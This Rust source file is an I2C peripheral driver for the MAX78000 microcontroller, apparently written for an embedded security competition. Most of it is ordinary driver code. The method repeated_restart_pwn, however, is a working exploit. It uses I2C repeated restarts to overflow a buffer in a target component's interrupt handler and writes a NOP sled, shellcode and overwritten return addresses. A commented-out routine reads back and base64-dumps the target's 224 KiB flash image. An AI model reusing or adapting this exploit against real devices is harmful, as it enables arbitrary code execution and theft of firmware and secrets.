use core::cell::RefCell;
use core::marker::PhantomData;
use core::slice;
use core::str;

use cortex_m::interrupt::{free as interrupt_free, Mutex};
use cortex_m::peripheral::NVIC;
use max78000_device::{interrupt, Interrupt, I2C1};
use base64::prelude::*;

use crate::gpio::{ConfigureIoOptions, Gpio, GpioPadConfig, GpioPinFunction, GpioPinVoltage, GpioType};
use crate::committed_array::{CommittedArray, CommittedArrayError};
use crate::{uprintln_debug, HalError};
use crate::gcr::Gcr;

pub const MAX_I2C_MESSAGE_LEN: usize = 256;

const I2C_FASTPLUS_SPEED: u32 = 1000000;
const RX_FIFO_LEN: u8 = 8;
const TX_FIFO_LEN: u8 = 8;

const INTFL0_MASK: u32 = 0x00ffffff;
const INTFL1_MASK: u32 = 0x00000007;
// error mask for interrupt flags0
const ERROR_MASK: u32 = 0x7f00;

const RX_THD: u32 = 1 << 4;
const TX_THD: u32 = 1 << 5;
const TX_LOCKOUT: u32 = 1 << 15;
const RD_ADDR_MATCH: u32 = 1 << 22;
const WR_ADDR_MATCH: u32 = 1 << 23;
const STOP: u32 = 1 << 6;

pub type I2cAddr = u8;

struct I2cInner {
    regs: I2C1,
}

impl I2cInner {
    fn clear_rx_fifo(&self) {
        self.regs.rxctrl0().modify(|_, rxctrl0| {
            rxctrl0.flush().set_bit()
        });

        while self.regs.rxctrl0().read().flush().bit_is_set() {
            //core::hint::spin_loop();
        }
    }

    fn clear_tx_fifo(&self) {
        self.regs.txctrl0().modify(|_, rxctrl0| {
            rxctrl0.flush().set_bit()
        });

        while self.regs.txctrl0().read().flush().bit_is_set() {
            //core::hint::spin_loop();
        }
    }

    fn set_rx_threshold(&self, n: u8) {
        assert!(n <= RX_FIFO_LEN);

        self.regs.rxctrl0().modify(|_, rxctrl0| {
            rxctrl0.thd_lvl().variant(n)
        });
    }

    fn set_tx_threshold(&self, n: u8) {
        assert!(n <= TX_FIFO_LEN);

        self.regs.txctrl0().modify(|_, txctrl0| {
            txctrl0.thd_val().variant(n)
        });
    }

    fn set_rx_threshold_int_enabled(&self, enabled: bool) {
        self.regs.inten0().modify(|_, inten0| {
            inten0.rx_thd().bit(enabled)
        });
    }

    fn set_tx_threshold_int_enabled(&self, enabled: bool) {
        self.regs.inten0().modify(|_, inten0| {
            inten0.tx_thd().bit(enabled)
        });
    }

    fn is_rx_fifo_empty(&self) -> bool {
        self.regs.status().read().rx_em().bit_is_set()
    }

    fn is_tx_fifo_full(&self) -> bool {
        self.regs.status().read().tx_full().bit_is_set()
    }

    fn is_tx_fifo_empty(&self) -> bool {
        self.regs.status().read().tx_em().bit_is_set()
    }

    fn num_bytes_in_txfifo(&self) -> u8 {
        self.regs.txctrl1().read().lvl().bits()
    }

    fn space_in_txfifo(&self) -> u8 {
        8 - self.num_bytes_in_txfifo()
    }

    fn read_rx_fifo(&self, buf: &mut [u8]) -> usize {
        let mut i = 0;

        while i < buf.len() && !self.is_rx_fifo_empty() {
            buf[i] = self.regs.fifo().read().data().bits();
            i += 1;
        }

        i
    }

    /// Writes the data into the txfifo
    /// 
    /// # Returns
    /// 
    /// Returns the number of bytes written
    fn write_tx_fifo(&self, data: &[u8]) -> usize {
        for (i, byte) in data.iter().enumerate() {
            if self.is_tx_fifo_full() {
                return i;
            }

            self.regs.fifo().write(|fifo| {
                // safety: writing any bit into fifo is ok
                unsafe { fifo.data().bits(*byte) }
            });
        }

        data.len()
    }

    fn clear_flags(&self, flags0: u32, flags1: u32) {
        self.regs.intfl0().write(|intfl0| {
            // safety: it is ok to write any bytes to flags 0
            unsafe { intfl0.bits(flags0) }
        });

        self.regs.intfl1().write(|intfl1| {
            // safety: it is ok to write any bytes to flags 1
            unsafe { intfl1.bits(flags1) }
        });
    }

    fn clear_tx_lockout(&self) {
        // TODO: determine if this check is even need, probably can be removed
        if self.regs.intfl0().read().tx_lockout().bit_is_set() {
            self.clear_flags(TX_LOCKOUT, 0);
        }
    }

    fn has_error(&self) -> bool {
        self.regs.intfl0().read().bits() & ERROR_MASK != 0
    }

    fn set_frequency(&self, hz: u32) {
        if hz > I2C_FASTPLUS_SPEED {
            unimplemented!("i2c fastplus speed not implemented");
        }

        let peripheral_clock = Gcr::with(|gcr| gcr.get_peripheral_clock_frequency());

        let ticks_total = peripheral_clock / hz;
        let ticks_per_hi_low = (ticks_total >> 1) - 1;

        if ticks_per_hi_low > 0x1ff || ticks_per_hi_low == 0 {
            panic!("invalid clock speed");
        }

        self.regs.clkhi().write(|clkhi| {
            clkhi.hi().variant(ticks_per_hi_low as u16)
        });

        self.regs.clklo().write(|clklo| {
            clklo.lo().variant(ticks_per_hi_low as u16)
        });
    }
}

pub struct UninitializedI2c(I2cInner);

impl UninitializedI2c {
    pub(crate) fn new(regs: I2C1) -> Self {
        UninitializedI2c(I2cInner {
            regs,
        })
    }

    fn init_common(&self) {
        Gcr::with(|gcr| {
            // first shutdown everything, this is what msdk does
            gcr.set_i2c1_clock_enabled(false);
            gcr.reset_i2c1();

            gcr.set_i2c1_clock_enabled(true);
        });

        Gpio::with(|gpio| {
            gpio.configure_io(ConfigureIoOptions {
                gpio_type: GpioType::Gpio0,
                pin_mask: 1 << 16 | 1 << 17,
                function: GpioPinFunction::Alternate1,
                pad: GpioPadConfig::None,
                voltage: GpioPinVoltage::Vddio,
            });
        });

        self.0.clear_rx_fifo();
        self.0.clear_tx_fifo();
        self.0.set_rx_threshold(6);
        self.0.set_tx_threshold(2);

        // enable i2c controller
        self.0.regs.ctrl().modify(|_, ctrl| {
            ctrl.en().set_bit()
        });
    }

    pub fn init_master(self, frequency_hz: u32) -> MasterI2c {
        self.init_common();
        self.0.regs.ctrl().modify(|_, ctrl| {
            ctrl.mst_mode().set_bit()
        });

        self.0.set_frequency(frequency_hz);

        MasterI2c(self.0)
    }

    pub fn init_client(self, frequency_hz: u32, address: I2cAddr) -> ClientI2c {
        self.init_common();

        // TODO: review this more, msdk does these operations but im not sure if they are right
        self.0.regs.slave0().write(|slave| {
            // safety: any bits in slave register can be set
            unsafe { slave.bits(0) }
        });

        if address > 0b1111111 {
            self.0.regs.slave0().write(|slave| {
                // set extended address
                unsafe { slave.bits(1) }
            });
        }

        self.0.regs.slave0().modify(|_, slave| {
            unsafe { slave.bits(address.into()) }
        });

        self.0.set_frequency(frequency_hz);

        self.0.regs.inten0().write(|inten0| {
            inten0.wr_addr_match().set_bit();
            inten0.rd_addr_match().set_bit()
        });

        interrupt_free(|token| {
            let mut handler_state = HANDLER_STATE.borrow(token).borrow_mut();
            assert!(handler_state.is_none(), "i2c handler state already initialized");

            *handler_state = Some(I2cHandlerState {
                i2c: self.0,
                i2c_regs: [[0; MAX_I2C_MESSAGE_LEN]; 6],
                i2c_regs_len: [MAX_I2C_MESSAGE_LEN, 1, 1, MAX_I2C_MESSAGE_LEN, 1, 1],
                regiser: 0,
                read_index: 0,
                write_index: 0,
                write_start: false,
            });
        });

        // safety: i2c1 interrupt has not yet ran, so it is not relying on any interrupt critical sections
        unsafe {
            NVIC::unmask(Interrupt::I2C1);
        }

        ClientI2c(PhantomData)
    }
}

pub struct MasterI2c(I2cInner);

impl MasterI2c {
    fn start(&self) {
        self.0.regs.mstctrl().modify(|_, mstctrl| {
            mstctrl.start().set_bit()
        });
    }

    fn stop(&self) {
        self.0.regs.mstctrl().modify(|_, mstctrl| {
            mstctrl.stop().set_bit()
        });

        while self.0.regs.mstctrl().read().stop().bit_is_set() {
            //core::hint::spin_loop();
        }
    }

    fn await_transaction_is_done(&self) {
        while self.0.regs.intfl0().read().done().bit_is_clear() {
            //core::hint::spin_loop();
        }
    }

    fn restart(&mut self) {
        self.0.regs.mstctrl().modify(|_, reg| {
            reg.restart().set_bit()
        });

        // wait for restart bit to get cleared
        while self.0.regs.mstctrl().read().restart().bit_is_set() {}
    }

    fn pwn_restart_recieve(&mut self, address: u8) -> Result<(), HalError> {
        if self.0.has_error() {
            return Err(HalError::I2cConnectionError);
        }

        // TEMP
        //self.stop();
        //self.await_transaction_is_done();

        self.0.clear_flags(INTFL0_MASK, INTFL1_MASK);
        self.0.clear_tx_fifo();
        self.0.clear_rx_fifo();

        self.0.regs.rxctrl1().modify(|_, rxctrl1| {
            rxctrl1.cnt().variant(0)
        });

        // write slave address with read bit set
        // TEMP
        //self.0.write_tx_fifo(&[(address << 1) | 1]);
        //self.start();

        self.restart();

        if self.0.has_error() {
            return Err(HalError::I2cConnectionError);
        }

        // write slave address with read bit set
        self.0.write_tx_fifo(&[(address << 1) | 1]);

        Ok(())
    }

    /// Exploits a buf with repeated restarts to cause an overflow in the reference design interrupt handler
    pub fn repeated_restart_pwn(&mut self, i2c_address: u8, shellcode: &[u8], recv_done_address: usize, write_len: usize) -> Result<(), HalError> {
        /*let mut test_buf = [55; 29];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:?}");

        let mut test_buf = [55; 29];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:?}");

        let mut test_buf = [55; 29];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:?}");*/

        // flags have to be cleared first, because if tx lockout flag is set,
        // clear tx fifo will be stuck in an infinite loop
        self.0.clear_flags(INTFL0_MASK, INTFL1_MASK);
        self.0.clear_tx_fifo();
        self.0.clear_rx_fifo();

        uprintln_debug!("preparing transaction");

        // set write address
        self.0.write_tx_fifo(&[i2c_address << 1 & !1]);

        // start send transaction
        self.start();

        uprintln_debug!("first transaction started");

        // select a size 255 register and write 6 bytes to trigger recieve threshhold on component
        // first byte is register 0 for recieve register
        // writing exactly 6 is important cause that is recieve threshshold
        // so it will read at least 6, it could happen 7 doesn't get there in time and repeated
        // read is repsonded with a nack because the rxfifo is not empty
        self.0.write_tx_fifo(&[
            0,
            0,
            0,
            0,
            0,
            0,
        ]);

        // wait for all bytes to write
        while !self.0.is_tx_fifo_empty() {}

        if self.0.has_error() {
            return Err(HalError::I2cConnectionError);
        }

        uprintln_debug!("all bytes written");

        // trigger a restart
        self.restart();

        uprintln_debug!("restart done");

        // set write address for some component
        self.0.write_tx_fifo(&[i2c_address << 1 & !1]);

        // set the recieve done register, which has a length of 1
        // write index will be past the end, so we are guarenteed to not overwrite it, so wait recieve will stay waiting
        self.0.write_tx_fifo(&[1]);

        // write 3 more bytes to get correct 4 byte alignmant (pairs with 5 data bytes from before)
        self.0.write_tx_fifo(&[0, 0, 0]);

        uprintln_debug!("regiseter selected");

        // in reference design, transmit len reg is at 20000b34
        // this is the base our overflow starts from
        //let recieve_done_address = 0x20000b34;

        // stack base is somewhere around 0x2001ffd8
        // the total amount of space to write out payload
        let write_space = write_len;

        // nop sleed at start of ram
        let mut nop_bytes = 0x10;
        // this will end up around 0x2000030000;

        // shellcode to dump the contents of flash to uart
        // current index we are writing of the shellcode
        let mut shellcode_index = 0;

        let mut return_address_bytes = write_space - nop_bytes - shellcode.len();
        // the address we overwrite and return to
        // add some bytes cause the write index will start off a bit shifted
        // lower byte needs to be 1 for arm interrupt vector table to work
        let return_addrss: u32 = (recv_done_address as u32 + 0x10) | 1;

        // there is ramVectorTable entry for i2c handler at 0x20000ed0

        // stores the number of iterations with no send
        // used to detect when we trigger the shellcode
        let mut num_iters_no_send = 0;

        // the write index now exceeds the length of the smaller register, so we can send as much as wanted
        loop {
            if self.0.has_error() {
                return Err(HalError::I2cConnectionError);
            }

            if nop_bytes > 0 {
                // write nop sled
                if self.0.space_in_txfifo() >= 2 {
                    // bytes of the instruction mov r8, r8 in thumb
                    // this is a no op, but it does cause a double fault
                    //self.0.write_tx_fifo(&[0xc0, 0x46]);
                    // this nop might work better
                    self.0.write_tx_fifo(&[0, 0xbf, 0, 0xbf]);
                    nop_bytes -= 4;

                    if nop_bytes == 0 {
                        uprintln_debug!("nop sled written");
                    }
                }
            } else if shellcode_index < shellcode.len() {
                // write shellcode
                if !self.0.is_tx_fifo_full() {
                    shellcode_index += self.0.write_tx_fifo(&shellcode[shellcode_index..]);

                    if shellcode_index >= shellcode.len() {
                        uprintln_debug!("shellcode written");
                    }
                }
            } else if return_address_bytes > 0 {
                // write return address
                //uprintln_debug!("num iters no send: {}", num_iters_no_send);
                if self.0.space_in_txfifo() >= 4 {
                    self.0.write_tx_fifo(&return_addrss.to_le_bytes());
                    return_address_bytes -= 4;

                    num_iters_no_send = 0;

                    if return_address_bytes == 0 {
                        uprintln_debug!("return addresses written");
                    }
                } else {
                    num_iters_no_send += 1;
                }

                if num_iters_no_send > 400 {
                    // if we have failed to send the past 400 times, consider it that the component has been pwned
                    break;
                }
            } else {
                break;
            }
        }

        uprintln_debug!("done");

        // TEMP
        /*self.stop();
        self.await_transaction_is_done();

        uprintln_debug!("test send");

        //self.send(i2c_address, &[0])?;

        // this check is needed in case all bytes are prefilled, the other check in the loop will not run
        if self.0.has_error() {
            return Err(HalError::I2cConnectionError);
        }

        uprintln_debug!("test recv");

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        crate::timer::sleep(core::time::Duration::from_secs(1));

        let mut test_buf = [55; 256];
        self.recv(i2c_address, &mut test_buf)?;
        uprintln_debug!("test buf: {test_buf:x?}");

        // give time for component to clear out its fifo (TODO: reduce time, high for testing)
        crate::timer::sleep(core::time::Duration::from_secs(30));*/

        // give time for component to clear out its fifo (TODO: reduce time, high for testing)
        crate::timer::sleep(core::time::Duration::from_millis(2));

        // now read back data from i2c

        /*const RECV_BATCH_SIZE: usize = 256;
        let mut recv_buf = [0; RECV_BATCH_SIZE * 3];

        let send_base64_encoded = |buf: [u8; 768], batch_count| {
            let index = batch_count * RECV_BATCH_SIZE;
            let mut base64_buffer = [0; 2000];

            let base64_len = BASE64_STANDARD.encode_slice(&buf[..index], &mut base64_buffer)
                .expect("could not encode base64");

            let base64 = str::from_utf8(&base64_buffer[..base64_len])
                .expect("could not convert base64 buf to utf8 string");

            crate::uprint!("{}", base64);
        };

        // 224 KiB recv, the whole flash image
        const RECV_LEN: usize = 224 * 1024;

        uprintln_debug!("start read");

        // total number of bytes recieved
        let mut recv_count = 0;
        while recv_count < RECV_LEN {
            self.pwn_restart_recieve(i2c_address)?;

            //uprintln_debug!("start first recieve");

            // recv 3 256 byte batches, which ensures it will be aligned for base64
            let mut recv_index = 0;
            while recv_index < RECV_BATCH_SIZE {
                recv_index += self.0.read_rx_fifo(&mut recv_buf[recv_index..]);
            }
            recv_count += RECV_BATCH_SIZE;

            //uprintln_debug!("finish first recieve");

            if recv_count >= RECV_LEN {
                send_base64_encoded(recv_buf, 1);
                break;
            }

            self.pwn_restart_recieve(i2c_address)?;

            //uprintln_debug!("start second recieve");

            recv_index = 0;
            while recv_index < RECV_BATCH_SIZE {
                recv_index += self.0.read_rx_fifo(&mut recv_buf[RECV_BATCH_SIZE + recv_index..]);
            }
            recv_count += RECV_BATCH_SIZE;

            //uprintln_debug!("finish second recieve");

            if recv_count >= RECV_LEN {
                send_base64_encoded(recv_buf, 2);
                break;
            }

            self.pwn_restart_recieve(i2c_address)?;

            //uprintln_debug!("start third recieve");

            recv_index = 0;
            while recv_index < RECV_BATCH_SIZE {
                recv_index += self.0.read_rx_fifo(&mut recv_buf[2 * RECV_BATCH_SIZE + recv_index..]);
            }
            recv_count += RECV_BATCH_SIZE;

            //uprintln_debug!("finish third recieve");

            // send back base64 encoded chunk
            send_base64_encoded(recv_buf, 3);

            let mut all_ones = true;
            for b in recv_buf.iter() {
                if *b != 0xff {
                    all_ones = false;
                    break;
                }
            }

            // if the block recieved is all ones, we consider that we have reached the end of the data we care about
            // because rest of flash is padded with ones
            if all_ones {
                break;
            }
        }*/

        // force a flush
        crate::uprintln!();

        self.0.regs.mstctrl().modify(|_, mstctrl| {
            mstctrl.stop().set_bit()
        });

        crate::uprintln!("stop");

        //self.stop();
        //self.await_transaction_is_done();

        if self.0.has_error() {
            Err(HalError::I2cConnectionError)
        } else {
            Ok(())
        }
    }

    pub fn reset(self) -> UninitializedI2c {
        UninitializedI2c(self.0)
    }

    /// Writes bytes to the given i2c address
    ///
    /// # Returns
    /// 
    /// Returns the number of bytes written
    pub fn send(&mut self, address: I2cAddr, data: &[u8]) -> Result<usize, HalError> {
        assert!(data.len() <= MAX_I2C_MESSAGE_LEN);
        if data.len() == 0 {
            return Ok(0);
        }

        // flags have to be cleared first, because if tx lockout flag is set,
        // clear tx fifo will be stuck in an infinite loop
        self.0.clear_flags(INTFL0_MASK, INTFL1_MASK);
        self.0.clear_tx_fifo();
        self.0.clear_rx_fifo();

        let mut write_len = 0;

        // write slave address with read bit cleared (write mode)
        self.0.write_tx_fifo(&[(address << 1) & !1]);

        // prefill fifo with data bytes
        write_len += self.0.write_tx_fifo(data);

        self.start();

        while write_len < data.len() {
            if self.0.regs.intfl0().read().tx_thd().bit_is_set() {
                write_len += self.0.write_tx_fifo(&data[write_len..]);

                self.0.clear_flags(TX_THD, 0);
            }

            if self.0.has_error() {
                self.stop();
                return Err(HalError::I2cConnectionError);
            }
        }

        self.stop();
        self.await_transaction_is_done();

        // this check is needed in case all bytes are prefilled, the other check in the loop will not run
        if self.0.has_error() {
            Err(HalError::I2cConnectionError)
        } else {
            Ok(write_len)
        }
    }

    pub fn recv(&mut self, address: I2cAddr, buffer: &mut [u8]) -> Result<(), HalError> {
        assert!(buffer.len() <= MAX_I2C_MESSAGE_LEN);
        if buffer.len() == 0 {
            return Ok(())
        }

        // flags have to be cleared first, because if tx lockout flag is set,
        // clear tx fifo will be stuck in an infinite loop
        self.0.clear_flags(INTFL0_MASK, INTFL1_MASK);
        self.0.clear_tx_fifo();
        self.0.clear_rx_fifo();

        let mut recv_len = 0;

        // set number of bytes to receive
        self.0.regs.rxctrl1().modify(|_, rxctrl1| {
            let write_len = if buffer.len() == MAX_I2C_MESSAGE_LEN {
                0
            } else {
                buffer.len() as u8
            };

            rxctrl1.cnt().variant(write_len)
        });
        
        // write slave address with read bit set
        self.0.write_tx_fifo(&[(address << 1) | 1]);

        self.start();

        while recv_len < buffer.len() {
            let flags = self.0.regs.intfl0().read();
            if flags.rx_thd().bit_is_set() || flags.done().bit_is_set() {
                recv_len += self.0.read_rx_fifo(&mut buffer[recv_len..]);

                self.0.clear_flags(RX_THD, 0);
            }

            if self.0.has_error() {
                self.stop();
                return Err(HalError::I2cConnectionError);
            }

            if flags.done().bit_is_set() {
                // TODO: support restart for larger transactions
                break;
            }
        }

        self.stop();
        self.await_transaction_is_done();

        if self.0.has_error() {
            Err(HalError::I2cConnectionError)
        } else {
            Ok(())
        }
    }
}

static CLIENT_SEND_BUFFER: CommittedArray = CommittedArray::new();
static CLIENT_RECEIVE_BUFFER: CommittedArray = CommittedArray::new();
pub struct ClientI2c(PhantomData<()>);

impl ClientI2c {
    pub fn send(&self, data: &[u8]) -> Result<(), HalError> {
        loop {
            match CLIENT_SEND_BUFFER.try_commit(data) {
                Ok(_) => return Ok(()),
                Err(CommittedArrayError::Busy) => (),
                Err(e) => return Err(e.into()),
            }
        }
    }

    pub fn recv<'a>(&self, buf: &'a mut [u8]) -> Result<&'a [u8], HalError> {
        loop {
            match CLIENT_RECEIVE_BUFFER.try_take(buf) {
                Ok(data) => {
                    // get around limitation of borrow checker
                    let len = data.len();
                    return Ok(&buf[..len]);
                },
                Err(CommittedArrayError::Busy) => (),
                Err(e) => return Err(e.into()),
            }
        }
    }
}

struct I2cHandlerState {
    i2c: I2cInner,
    i2c_regs: [[u8; MAX_I2C_MESSAGE_LEN]; 6],
    i2c_regs_len: [usize; 6],
    regiser: u8,
    read_index: usize,
    write_index: usize,
    write_start: bool,
}

impl I2cHandlerState {
    fn read(&mut self) {
        if self.write_start {
            self.i2c.read_rx_fifo(slice::from_mut(&mut self.regiser));
        }

        let Self {
            i2c,
            i2c_regs,
            regiser,
            read_index,
            ..
        } = self;

        if (*regiser as usize) < i2c_regs.len() {
            let register_data = &mut i2c_regs[*regiser as usize];
            *read_index += i2c.read_rx_fifo(&mut register_data[*read_index..]);
        }
    }

    fn write(&mut self) {
        self.i2c.clear_tx_lockout();

        let Self {
            i2c,
            i2c_regs,
            i2c_regs_len,
            regiser,
            write_index,
            ..
        } = self;

        if (*regiser as usize) < i2c_regs.len() {
            let register_data = &mut i2c_regs[*regiser as usize];
            *write_index += i2c.write_tx_fifo(&mut register_data[*write_index..]);

            let reg_len = i2c_regs_len[*regiser as usize];
            if reg_len - 1 == *write_index {
                i2c.regs.inten0().modify(|_, inten0| {
                    inten0.tx_thd().clear_bit()
                });
            }
        }
    }

    fn handle_interrupt(&mut self) {
        let flags = self.i2c.regs.intfl0().read();

        if flags.stop().bit_is_set() {
            self.read();

            if self.regiser == 0 {
                // receieve
                let _ = CLIENT_RECEIVE_BUFFER.try_commit(self.i2c_regs[0].as_mut_slice());
            }

            self.i2c.regs.inten0().write(|inten0| {
                inten0.rx_thd().clear_bit();
                inten0.tx_thd().clear_bit()
            });

            if !self.i2c.is_rx_fifo_empty() {
                self.i2c.clear_rx_fifo();
            }

            if !self.i2c.is_tx_fifo_empty() {
                self.i2c.clear_tx_fifo();
            }

            self.read_index = 0;
            self.write_index = 0;
            self.write_start = false;

            self.i2c.clear_flags(STOP, 0);
        }

        if flags.tx_thd().bit_is_set() && self.i2c.regs.inten0().read().tx_thd().bit_is_set() {
            self.write();
            self.i2c.clear_flags(TX_THD, 0);
        }

        if flags.wr_addr_match().bit_is_set() {
            let _ = CLIENT_SEND_BUFFER.try_take(self.i2c_regs[3].as_mut_slice());

            self.i2c.clear_flags(WR_ADDR_MATCH, 0);

            if self.i2c.regs.intfl0().read().tx_lockout().bit_is_set() {
                self.i2c.clear_tx_lockout();

                self.i2c.read_rx_fifo(slice::from_mut(&mut self.regiser));

                let Self {
                    i2c,
                    i2c_regs,
                    i2c_regs_len,
                    regiser,
                    write_index,
                    ..
                } = self;
        
                if (*regiser as usize) < i2c_regs.len() {
                    let register_data = &mut i2c_regs[*regiser as usize];
                    *write_index += i2c.write_tx_fifo(&mut register_data[*write_index..]);
        
                    let reg_len = i2c_regs_len[*regiser as usize];
                    if *write_index < reg_len {
                        i2c.regs.inten0().modify(|_, inten0| {
                            inten0.tx_thd().set_bit()
                        });
                    }
                }
            }
        }

        if flags.rd_addr_match().bit_is_set() {
            self.write_start = true;

            self.i2c.regs.inten0().modify(|_, inten0| {
                inten0.rx_thd().set_bit()
            });

            self.i2c.clear_flags(RD_ADDR_MATCH, 0);
        }

        if flags.rx_thd().bit_is_set() {
            self.read();

            self.i2c.clear_flags(RX_THD, 0);
        }
    }
}

static HANDLER_STATE: Mutex<RefCell<Option<I2cHandlerState>>> = Mutex::new(RefCell::new(None));

#[allow(non_snake_case)]
#[interrupt]
fn I2C1() {
    interrupt_free(|token| {
        if let Some(state) = HANDLER_STATE.borrow(token).borrow_mut().as_mut() {
            state.handle_interrupt();
        }
    });
}
